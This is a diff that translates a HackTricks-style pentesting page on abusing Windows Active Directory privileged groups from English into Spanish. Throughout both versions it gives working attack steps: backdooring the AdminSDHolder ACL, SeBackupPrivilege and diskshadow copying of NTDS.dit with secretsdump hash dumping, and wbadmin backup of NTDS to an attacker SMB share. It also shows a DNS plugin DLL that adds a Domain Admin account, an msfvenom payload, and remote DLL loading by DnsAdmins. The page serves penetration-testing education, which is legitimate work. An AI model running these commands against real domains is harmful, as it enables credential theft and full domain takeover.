@@ -1,115 +1,98 @@
-# Privileged Groups
+# Grupos Privilegiados
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-## Well Known groups with administration privileges
+## Grupos Bien Conocidos con Privilegios de Administración
 
-- **Administrators**
-- **Domain Admins**
-- **Enterprise Admins**
+- **Administradores**
+- **Administradores de Dominio**
+- **Administradores de Empresa**
 
-## Account Operators
+## Operadores de Cuenta
 
-This group is empowered to create accounts and groups that are not administrators on the domain. Additionally, it enables local login to the Domain Controller (DC).
+Este grupo tiene la capacidad de crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Controlador de Dominio (DC).
 
-To identify the members of this group, the following command is executed:
-
+Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
+Agregar nuevos usuarios está permitido, así como el inicio de sesión local en DC01.
 
-Adding new users is permitted, as well as local login to DC01.
+## Grupo AdminSDHolder
 
-## AdminSDHolder group
+La lista de control de acceso (ACL) del grupo **AdminSDHolder** es crucial, ya que establece permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo garantiza la seguridad de estos grupos al prevenir modificaciones no autorizadas.
 
-The **AdminSDHolder** group's Access Control List (ACL) is crucial as it sets permissions for all "protected groups" within Active Directory, including high-privilege groups. This mechanism ensures the security of these groups by preventing unauthorized modifications.
+Un atacante podría explotar esto modificando la ACL del grupo **AdminSDHolder**, otorgando permisos completos a un usuario estándar. Esto le daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de este usuario son alterados o eliminados, se restablecerían automáticamente dentro de una hora debido al diseño del sistema.
 
-An attacker could exploit this by modifying the **AdminSDHolder** group's ACL, granting full permissions to a standard user. This would effectively give that user full control over all protected groups. If this user's permissions are altered or removed, they would be automatically reinstated within an hour due to the system's design.
-
-Commands to review the members and modify permissions include:
-
+Los comandos para revisar los miembros y modificar permisos incluyen:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
+Un script está disponible para acelerar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Para más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+## Papelera de reciclaje de AD
 
-## AD Recycle Bin
-
-Membership in this group allows for the reading of deleted Active Directory objects, which can reveal sensitive information:
-
+La membresía en este grupo permite la lectura de objetos de Active Directory eliminados, lo que puede revelar información sensible:
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+### Acceso al Controlador de Dominio
 
-### Domain Controller Access
+El acceso a los archivos en el DC está restringido a menos que el usuario sea parte del grupo `Server Operators`, lo que cambia el nivel de acceso.
 
-Access to files on the DC is restricted unless the user is part of the `Server Operators` group, which changes the level of access.
+### Escalamiento de Privilegios
 
-### Privilege Escalation
-
-Using `PsService` or `sc` from Sysinternals, one can inspect and modify service permissions. The `Server Operators` group, for instance, has full control over certain services, allowing for the execution of arbitrary commands and privilege escalation:
-
+Usando `PsService` o `sc` de Sysinternals, se puede inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite la ejecución de comandos arbitrarios y el escalamiento de privilegios:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-
-This command reveals that `Server Operators` have full access, enabling the manipulation of services for elevated privileges.
+Este comando revela que `Server Operators` tienen acceso completo, lo que permite la manipulación de servicios para obtener privilegios elevados.
 
 ## Backup Operators
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.
+La membresía en el grupo `Backup Operators` proporciona acceso al sistema de archivos de `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten la navegación por carpetas, la enumeración y la capacidad de copiar archivos, incluso sin permisos explícitos, utilizando la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.
 
-To list group members, execute:
-
+Para listar los miembros del grupo, ejecute:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
+### Ataque Local
 
-### Local Attack
+Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:
 
-To leverage these privileges locally, the following steps are employed:
-
-1. Import necessary libraries:
-
+1. Importar las bibliotecas necesarias:
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-
-2. Enable and verify `SeBackupPrivilege`:
-
+2. Habilitar y verificar `SeBackupPrivilege`:
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-
-3. Access and copy files from restricted directories, for instance:
-
+3. Acceder y copiar archivos de directorios restringidos, por ejemplo:
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-
 ### AD Attack
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+El acceso directo al sistema de archivos del Controlador de Dominio permite el robo de la base de datos `NTDS.dit`, que contiene todos los hashes NTLM para usuarios y computadoras del dominio.
 
 #### Using diskshadow.exe
 
-1. Create a shadow copy of the `C` drive:
-
+1. Crear una copia sombra de la unidad `C`:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -122,59 +105,47 @@ expose %cdrive% F:
 end backup
 exit
 ```
-
-2. Copy `NTDS.dit` from the shadow copy:
-
+2. Copie `NTDS.dit` de la copia de sombra:
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-
-Alternatively, use `robocopy` for file copying:
-
+Alternativamente, utiliza `robocopy` para copiar archivos:
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
-
+3. Extraer `SYSTEM` y `SAM` para la recuperación de hashes:
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-
-4. Retrieve all hashes from `NTDS.dit`:
-
+4. Recuperar todos los hashes de `NTDS.dit`:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+#### Usando wbadmin.exe
 
-#### Using wbadmin.exe
+1. Configura el sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacena en caché las credenciales SMB en la máquina objetivo.
+2. Usa `wbadmin.exe` para la copia de seguridad del sistema y la extracción de `NTDS.dit`:
+```cmd
+net use X: \\<AttackIP>\sharename /user:smbuser password
+echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
+wbadmin get versions
+echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
 
-1. Set up NTFS filesystem for SMB server on attacker machine and cache SMB credentials on the target machine.
-2. Use `wbadmin.exe` for system backup and `NTDS.dit` extraction:
-   ```cmd
-   net use X: \\<AttackIP>\sharename /user:smbuser password
-   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
-   wbadmin get versions
-   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
-   ```
-
-For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Para una demostración práctica, consulta [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.
+Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar un DLL arbitrario con privilegios de SYSTEM en un servidor DNS, a menudo alojado en Controladores de Dominio. Esta capacidad permite un potencial de explotación significativo.
 
-To list members of the DnsAdmins group, use:
-
+Para listar los miembros del grupo DnsAdmins, usa:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
+### Ejecutar DLL arbitraria
 
-### Execute arbitrary DLL
-
-Members can make the DNS server load an arbitrary DLL (either locally or from a remote share) using commands such as:
-
+Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) utilizando comandos como:
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -185,8 +156,8 @@ An attacker could modify the DLL to add a user to the Domain Admins group or exe
 // Modify DLL to add user
 DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
 {
-    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
-    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
+system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
+system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
 }
 ```
 
@@ -194,107 +165,90 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-
-Restarting the DNS service (which may require additional permissions) is necessary for the DLL to be loaded:
-
+Reiniciar el servicio DNS (lo que puede requerir permisos adicionales) es necesario para que se cargue el DLL:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-
-For more details on this attack vector, refer to ired.team.
+Para más detalles sobre este vector de ataque, consulta ired.team.
 
 #### Mimilib.dll
 
-It's also feasible to use mimilib.dll for command execution, modifying it to execute specific commands or reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.
+También es factible usar mimilib.dll para la ejecución de comandos, modificándolo para ejecutar comandos específicos o shells reversos. [Consulta esta publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para más información.
 
-### WPAD Record for MitM
+### Registro WPAD para MitM
 
-DnsAdmins can manipulate DNS records to perform Man-in-the-Middle (MitM) attacks by creating a WPAD record after disabling the global query block list. Tools like Responder or Inveigh can be used for spoofing and capturing network traffic.
+DnsAdmins pueden manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) creando un registro WPAD después de deshabilitar la lista de bloqueo de consultas global. Herramientas como Responder o Inveigh se pueden usar para suplantar y capturar tráfico de red.
 
-### Event Log Readers
-Members can access event logs, potentially finding sensitive information such as plaintext passwords or command execution details:
-
+### Lectores de Registros de Eventos
+Los miembros pueden acceder a los registros de eventos, encontrando potencialmente información sensible como contraseñas en texto plano o detalles de ejecución de comandos:
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
+## Permisos de Windows de Exchange
 
-## Exchange Windows Permissions
-
-This group can modify DACLs on the domain object, potentially granting DCSync privileges. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
-
+Este grupo puede modificar DACLs en el objeto de dominio, lo que podría otorgar privilegios de DCSync. Las técnicas para la escalada de privilegios que explotan este grupo se detallan en el repositorio de GitHub Exchange-AD-Privesc.
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
+## Administradores de Hyper-V
 
-## Hyper-V Administrators
+Los Administradores de Hyper-V tienen acceso completo a Hyper-V, lo que puede ser explotado para obtener control sobre Controladores de Dominio virtualizados. Esto incluye clonar DCs en vivo y extraer hashes NTLM del archivo NTDS.dit.
 
-Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
+### Ejemplo de Explotación
 
-### Exploitation Example
-
-Firefox's Mozilla Maintenance Service can be exploited by Hyper-V Administrators to execute commands as SYSTEM. This involves creating a hard link to a protected SYSTEM file and replacing it with a malicious executable:
-
+El Servicio de Mantenimiento de Mozilla Firefox puede ser explotado por los Administradores de Hyper-V para ejecutar comandos como SYSTEM. Esto implica crear un enlace duro a un archivo protegido de SYSTEM y reemplazarlo con un ejecutable malicioso:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
+Nota: La explotación de enlaces duros ha sido mitigada en las actualizaciones recientes de Windows.
 
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+## Gestión de la Organización
 
-## Organization Management
+En entornos donde se despliega **Microsoft Exchange**, un grupo especial conocido como **Organización Management** tiene capacidades significativas. Este grupo tiene privilegios para **acceder a los buzones de todos los usuarios del dominio** y mantiene **control total sobre la Unidad Organizativa (OU) 'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede ser explotado para la escalación de privilegios.
 
-In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.
+### Explotación de Privilegios y Comandos
 
-### Privilege Exploitation and Commands
+#### Operadores de Impresión
 
-#### Print Operators
+Los miembros del grupo **Print Operators** están dotados de varios privilegios, incluyendo el **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Controlador de Dominio**, apagarlo y gestionar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto no elevado, es necesario eludir el Control de Cuentas de Usuario (UAC).
 
-Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.
-
-To list the members of this group, the following PowerShell command is used:
-
+Para listar los miembros de este grupo, se utiliza el siguiente comando de PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+Para obtener técnicas de explotación más detalladas relacionadas con **`SeLoadDriverPrivilege`**, se deben consultar recursos de seguridad específicos.
 
-For more detailed exploitation techniques related to **`SeLoadDriverPrivilege`**, one should consult specific security resources.
+#### Usuarios de Escritorio Remoto
 
-#### Remote Desktop Users
-
-This group's members are granted access to PCs via Remote Desktop Protocol (RDP). To enumerate these members, PowerShell commands are available:
-
+A los miembros de este grupo se les concede acceso a PCs a través del Protocolo de Escritorio Remoto (RDP). Para enumerar a estos miembros, están disponibles comandos de PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
+Más información sobre la explotación de RDP se puede encontrar en recursos dedicados de pentesting.
 
-Further insights into exploiting RDP can be found in dedicated pentesting resources.
+#### Usuarios de Gestión Remota
 
-#### Remote Management Users
-
-Members can access PCs over **Windows Remote Management (WinRM)**. Enumeration of these members is achieved through:
-
+Los miembros pueden acceder a PCs a través de **Windows Remote Management (WinRM)**. La enumeración de estos miembros se logra a través de:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
+Para técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.
 
-For exploitation techniques related to **WinRM**, specific documentation should be consulted.
+#### Operadores de Servidor
 
-#### Server Operators
-
-This group has permissions to perform various configurations on Domain Controllers, including backup and restore privileges, changing system time, and shutting down the system. To enumerate the members, the command provided is:
-
+Este grupo tiene permisos para realizar varias configuraciones en Controladores de Dominio, incluyendo privilegios de copia de seguridad y restauración, cambio de hora del sistema y apagado del sistema. Para enumerar los miembros, el comando proporcionado es:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-
-## References <a href="#references" id="references"></a>
+## Referencias <a href="#references" id="references"></a>
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -313,10 +267,9 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
